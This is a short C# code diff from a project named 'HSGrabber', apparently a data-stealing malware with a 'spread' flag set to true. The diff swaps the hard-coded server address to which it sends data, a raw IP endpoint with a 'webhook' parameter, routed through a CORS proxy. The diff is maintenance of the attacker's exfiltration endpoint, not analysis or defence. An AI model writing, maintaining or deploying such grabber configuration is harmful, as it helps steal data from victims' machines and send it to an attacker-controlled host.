@@ -10,7 +10,7 @@ namespace HSGrabber
 
 		public static bool spread = true;
 
-		private static string serverurl = "http://62.210.119.165/api/v1/send?webhook=yourwebhook";
+		private static string serverurl = "http://62.4.16.141/api/v1/send?webhook=yourwebhook"; // keep API url
 
 		public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl;
 	}
